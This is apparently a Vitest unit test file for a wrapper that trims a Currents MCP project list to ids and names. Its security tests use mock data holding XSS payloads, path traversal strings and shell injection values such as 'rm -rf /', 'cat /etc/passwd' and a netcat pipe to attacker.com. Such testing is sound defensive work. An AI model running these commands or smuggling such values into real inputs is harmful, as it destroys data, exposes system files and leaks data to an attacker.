/**
 * Unit Tests for getProjects Wrapper
 *
 * Tests wrapper logic in isolation using mocked MCP client.
 * Validates filtering, token reduction, schema validation, and error handling.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  createMCPMock,
  testSecurityScenarios,
  getAllSecurityScenarios,
  MCPErrors,
} from '@claude/testing';

// Mock the MCP client module BEFORE importing
// This prevents vitest from loading the real module
vi.mock('../config/lib/mcp-client', () => ({
  callMCPTool: vi.fn(),
}));

// Import the wrapper to test
import { getProjects } from './get-projects';

// Import MCP client for type access
import * as mcpClient from '../config/lib/mcp-client';

describe('getProjects - Unit Tests', () => {
  let mcpMock: ReturnType<typeof createMCPMock>;

  beforeEach(() => {
    // Create fresh mock for each test
    mcpMock = createMCPMock();
    vi.mocked(mcpClient.callMCPTool).mockImplementation(mcpMock);
  });

  afterEach(() => {
    // Clear mocks after each test
    vi.clearAllMocks();
  });

  // ==========================================================================
  // Category 1: Wrapper Logic Tests (Mocked)
  // ==========================================================================

  describe('Filtering logic', () => {
    it('should filter response correctly', async () => {
      // Arrange: Mock MCP response - Currents returns projects with metadata
      const mockProjects = [
        {
          projectId: 'project-1',
          name: 'Project Alpha',
          description: 'Test project with lots of metadata',
          settings: { timeout: 30000 },
          createdAt: '2024-01-01T00:00:00Z',
          updatedAt: '2024-01-15T00:00:00Z',
        },
        {
          projectId: 'project-2',
          name: 'Project Beta',
          description: 'Another test project',
          settings: { timeout: 60000 },
          createdAt: '2024-01-02T00:00:00Z',
          updatedAt: '2024-01-16T00:00:00Z',
        },
      ];

      mcpMock.mockResolvedValue(mockProjects);

      // Act: Execute wrapper
      const result = await getProjects.execute({});

      // Assert: Verify response filtered to essentials only
      expect(result).toBeDefined();
      expect(result.projects).toHaveLength(2);
      expect(result.totalProjects).toBe(2);
      expect(result.estimatedTokens).toBeGreaterThan(0);

      // Verify filtered projects only have id and name
      expect(result.projects[0]).toEqual({
        id: 'project-1',
        name: 'Project Alpha',
      });
      expect(result.projects[0]).not.toHaveProperty('description');
      expect(result.projects[0]).not.toHaveProperty('settings');
      expect(result.projects[0]).not.toHaveProperty('createdAt');

      expect(result.projects[1]).toEqual({
        id: 'project-2',
        name: 'Project Beta',
      });

      // Verify MCP client called correctly
      expect(mcpMock).toHaveBeenCalledTimes(1);
      expect(mcpMock).toHaveBeenCalledWith('currents', 'currents-get-projects', {});
    });

    it('should handle empty projects list', async () => {
      // Arrange: Mock empty response
      mcpMock.mockResolvedValue([]);

      // Act
      const result = await getProjects.execute({});

      // Assert
      expect(result.projects).toEqual([]);
      expect(result.totalProjects).toBe(0);
      expect(result.estimatedTokens).toBe(1); // Empty array "[]" = 2 chars = 1 token
    });

    it('should handle missing projects field', async () => {
      // Arrange: Mock response without projects field
      mcpMock.mockResolvedValue({});

      // Act
      const result = await getProjects.execute({});

      // Assert: Should default to empty array
      expect(result.projects).toEqual([]);
      expect(result.totalProjects).toBe(0);
      expect(result.estimatedTokens).toBe(1); // Empty array "[]" = 2 chars = 1 token
    });

    it('should handle large project lists', async () => {
      // Arrange: Mock many projects (direct array with projectId)
      const mockProjects = Array.from({ length: 50 }, (_, i) => ({
        projectId: `project-${i}`,
        name: `Project ${i}`,
        description: 'Metadata that will be filtered out',
        settings: {},
      }));

      mcpMock.mockResolvedValue(mockProjects);

      // Act
      const result = await getProjects.execute({});

      // Assert
      expect(result.projects).toHaveLength(50);
      expect(result.totalProjects).toBe(50);
      expect(result.estimatedTokens).toBeGreaterThan(0);

      // Verify all projects filtered correctly
      result.projects.forEach((project, i) => {
        expect(project).toEqual({
          id: `project-${i}`,
          name: `Project ${i}`,
        });
      });
    });
  });

  describe('Token estimation', () => {
    it('should calculate token estimate correctly', async () => {
      // Arrange: Mock response with projects
      const mockProjects = [
        { projectId: 'p1', name: 'Project 1' },
        { projectId: 'p2', name: 'Project 2' },
      ];

      mcpMock.mockResolvedValue(mockProjects);

      // Act
      const result = await getProjects.execute({});

      // Assert: Token estimate should be based on filtered JSON size
      const expectedSize = JSON.stringify(result.projects).length;
      const expectedTokens = Math.ceil(expectedSize / 4);

      expect(result.estimatedTokens).toBe(expectedTokens);
      expect(result.estimatedTokens).toBeGreaterThan(0);

      console.log(`Estimated tokens: ${result.estimatedTokens}`);
    });

    it('should handle minimal project data', async () => {
      // Arrange: Mock minimal response (direct array)
      mcpMock.mockResolvedValue([{ projectId: 'p1', name: 'P' }]);

      // Act
      const result = await getProjects.execute({});

      // Assert: Small token count
      expect(result.estimatedTokens).toBeGreaterThan(0);
      expect(result.estimatedTokens).toBeLessThan(20);
    });

    it('should calculate minimal tokens for empty list', async () => {
      // Arrange
      mcpMock.mockResolvedValue([]);

      // Act
      const result = await getProjects.execute({});

      // Assert: Empty array "[]" = 2 chars = 1 token
      expect(result.estimatedTokens).toBe(1);
    });
  });

  describe('Response format handling', () => {
    it('should handle direct array format', async () => {
      // Arrange: MCP returns direct array format (correct format for Currents)
      const mockArray = [
        { projectId: 'p1', name: 'Project 1' },
        { projectId: 'p2', name: 'Project 2' },
      ];
      mcpMock.mockResolvedValue(mockArray);

      // Act
      const result = await getProjects.execute({});

      // Assert: Should handle direct array correctly
      expect(result.projects).toHaveLength(2);
      expect(result.projects[0]).toEqual({ id: 'p1', name: 'Project 1' });
      expect(result.projects[1]).toEqual({ id: 'p2', name: 'Project 2' });
      expect(result.totalProjects).toBe(2);
    });

    it('should handle object format (returns empty array)', async () => {
      // Arrange: MCP returns object format with projects key (NOT the actual format)
      // Real Currents MCP returns direct array, not wrapped in object
      mcpMock.mockResolvedValue({
        projects: [
          { projectId: 'p1', name: 'Project 1' },
          { projectId: 'p2', name: 'Project 2' },
        ],
      });

      // Act
      const result = await getProjects.execute({});

      // Assert: Wrapper expects direct array, so object format returns empty
      expect(result.projects).toHaveLength(0);
      expect(result.totalProjects).toBe(0);
    });

    it('should handle tuple format', async () => {
      // Arrange: MCP returns tuple format (edge case)
      const mockTuple = [
        { projectId: 'p1', name: 'Project 1' },
        { projectId: 'p2', name: 'Project 2' },
      ];
      mcpMock.mockResolvedValue(mockTuple);

      // Act
      const result = await getProjects.execute({});

      // Assert: Should handle tuple without crashing
      expect(result.projects).toBeDefined();
      expect(Array.isArray(result.projects)).toBe(true);
    });
  });

  // ==========================================================================
  // Category 2: Error Handling Tests
  // ==========================================================================

  describe('MCP server errors', () => {
    it('should handle rate limit errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.rateLimit());

      // Act & Assert
      await expect(getProjects.execute({})).rejects.toThrow(/rate limit/i);
    });

    it('should handle server errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.serverError());

      // Act & Assert
      await expect(getProjects.execute({})).rejects.toThrow(/server.*error/i);
    });

    it('should handle network timeout', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.timeout());

      // Act & Assert
      await expect(getProjects.execute({})).rejects.toThrow(/ETIMEDOUT/);
    });

    it('should handle authentication errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.unauthorized());

      // Act & Assert
      await expect(getProjects.execute({})).rejects.toThrow(/authentication required/i);
    });
  });

  describe('Malformed responses', () => {
    it('should handle projects with missing projectId', async () => {
      // Arrange: Mock response with incomplete project data (direct array)
      mcpMock.mockResolvedValue([
        { projectId: 'p1', name: 'Valid Project' },
        { name: 'Missing ProjectID' }, // Missing projectId field
      ]);

      // Act
      const result = await getProjects.execute({});

      // Assert: Should filter out projects without both projectId and name
      expect(result.projects).toHaveLength(1);
      expect(result.projects[0]).toEqual({
        id: 'p1',  // Note: projectId is mapped to id in output
        name: 'Valid Project',
      });
      expect(result.totalProjects).toBe(1);
    });

    it('should handle projects with missing name', async () => {
      // Arrange: Mock response with incomplete project data (direct array)
      mcpMock.mockResolvedValue([
        { projectId: 'p1', name: 'Valid Project' },
        { projectId: 'p2' }, // Missing name field
      ]);

      // Act
      const result = await getProjects.execute({});

      // Assert: Should filter out projects without both projectId and name
      expect(result.projects).toHaveLength(1);
      expect(result.projects[0]).toEqual({
        id: 'p1',  // Note: projectId is mapped to id in output
        name: 'Valid Project',
      });
      expect(result.totalProjects).toBe(1);
    });

    it('should handle null projects array', async () => {
      // Arrange
      mcpMock.mockResolvedValue(null);

      // Act
      const result = await getProjects.execute({});

      // Assert: Should default to empty array
      expect(result.projects).toEqual([]);
      expect(result.totalProjects).toBe(0);
    });
  });

  // ==========================================================================
  // Category 3: Input Validation Tests
  // ==========================================================================

  describe('Input validation', () => {
    it('should accept empty input object', async () => {
      // Arrange
      mcpMock.mockResolvedValue([]);

      // Act & Assert: Should not throw
      await expect(getProjects.execute({})).resolves.toBeDefined();
      expect(mcpMock).toHaveBeenCalledTimes(1);
    });

    it('should reject invalid input types', async () => {
      // Act & Assert: Various invalid inputs
      await expect(getProjects.execute(null as any)).rejects.toThrow();
      await expect(getProjects.execute(undefined as any)).rejects.toThrow();
      await expect(getProjects.execute('invalid' as any)).rejects.toThrow();
      await expect(getProjects.execute(123 as any)).rejects.toThrow();
    });
  });

  // ==========================================================================
  // Category 4: Security Tests (Input Sanitization)
  // ==========================================================================

  describe('Security', () => {
    /**
     * Note: This wrapper has NO USER STRING INPUTS (empty input schema: z.object({}))
     * Therefore, path traversal, command injection, and XSS attacks via user input are not applicable.
     * The security tests below validate output handling of MCP response data.
     */

    it('should have no user inputs requiring injection validation', () => {
      // Verify input schema is empty - no user-controlled strings
      expect(getProjects.inputSchema).toBeDefined();
      // Input schema should be empty object with no string fields
      const shape = getProjects.inputSchema.shape;
      expect(Object.keys(shape)).toHaveLength(0);
    });

    it('should safely handle malicious data in MCP response (XSS prevention)', async () => {
      // Arrange: MCP returns projects with XSS payloads (from malicious data source)
      const maliciousProjects = [
        {
          projectId: '<script>alert("xss")</script>',
          name: 'Normal Project',
        },
        {
          projectId: 'project-2',
          name: '<img src=x onerror=alert("xss")>',
        },
        {
          projectId: 'project-3',
          name: 'javascript:alert("xss")',
        },
      ];
      mcpMock.mockResolvedValue(maliciousProjects);

      // Act
      const result = await getProjects.execute({});

      // Assert: Data is passed through (filtering is handled by consumers)
      // Wrapper responsibility is token reduction, not sanitization of MCP data
      expect(result.projects).toHaveLength(3);
      expect(result.projects[0].id).toBe('<script>alert("xss")</script>');
      expect(result.projects[1].name).toBe('<img src=x onerror=alert("xss")>');
    });

    it('should safely handle path traversal sequences in MCP response', async () => {
      // Arrange: MCP returns projects with path traversal patterns (from malicious API)
      const maliciousProjects = [
        {
          projectId: '../../../etc/passwd',
          name: '../../config/secrets',
        },
        {
          projectId: '..\\..\\windows\\system32',
          name: 'Normal Project',
        },
      ];
      mcpMock.mockResolvedValue(maliciousProjects);

      // Act
      const result = await getProjects.execute({});

      // Assert: Data passes through (this is MCP response data, not user input)
      expect(result.projects).toHaveLength(2);
      expect(result.projects[0].id).toBe('../../../etc/passwd');
    });

    it('should safely handle command injection patterns in MCP response', async () => {
      // Arrange: MCP returns projects with shell injection patterns
      const maliciousProjects = [
        {
          projectId: 'project; rm -rf /',
          name: 'project && cat /etc/passwd',
        },
        {
          projectId: 'project | nc attacker.com 1234',
          name: '$(whoami)',
        },
      ];
      mcpMock.mockResolvedValue(maliciousProjects);

      // Act
      const result = await getProjects.execute({});

      // Assert: Data passes through unchanged
      expect(result.projects).toHaveLength(2);
      expect(result.projects[0].id).toBe('project; rm -rf /');
      expect(result.projects[1].name).toBe('$(whoami)');
    });

    it('should safely handle control characters in MCP response', async () => {
      // Arrange: MCP returns projects with control characters
      const maliciousProjects = [
        {
          projectId: 'project\x00null',
          name: 'project\r\ncrlf',
        },
        {
          projectId: 'project\x1b[31mred',
          name: 'Normal',
        },
      ];
      mcpMock.mockResolvedValue(maliciousProjects);

      // Act
      const result = await getProjects.execute({});

      // Assert: Data passes through (wrapper doesn't sanitize MCP responses)
      expect(result.projects).toHaveLength(2);
      expect(result.projects[0].id).toContain('\x00');
    });
  });

  // ==========================================================================
  // Category 5: Performance Tests
  // ==========================================================================

  describe('Performance', () => {
    it('should have minimal wrapper overhead', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        projects: [{ projectId: 'p1', name: 'Project 1' }],
      });

      // Act: Measure execution time
      const start = Date.now();
      const iterations = 100;

      for (let i = 0; i < iterations; i++) {
        await getProjects.execute({});
      }

      const avgTime = (Date.now() - start) / iterations;

      // Assert: Average time should be very fast (mocked)
      expect(avgTime).toBeLessThan(10); // <10ms per call
      console.log(`Average execution time: ${avgTime.toFixed(2)}ms per call`);
    });

    it('should handle filtering large datasets efficiently', async () => {
      // Arrange: Mock response with many projects
      const mockProjects = Array.from({ length: 1000 }, (_, i) => ({
        projectId: `project-${i}`,
        name: `Project ${i}`,
        description: 'Lots of metadata to filter',
        settings: { timeout: 30000 },
        createdAt: '2024-01-01T00:00:00Z',
        updatedAt: '2024-01-15T00:00:00Z',
        extraData: { foo: 'bar', baz: 'qux' },
      }));

      mcpMock.mockResolvedValue(mockProjects);

      // Act: Measure filtering time
      const start = Date.now();
      const result = await getProjects.execute({});
      const filterTime = Date.now() - start;

      // Assert: Filtering should be fast even for large datasets
      expect(result.projects).toHaveLength(1000);
      expect(filterTime).toBeLessThan(50); // <50ms for 1000 projects
      console.log(`Filter time for 1000 projects: ${filterTime}ms`);
    });
  });
});
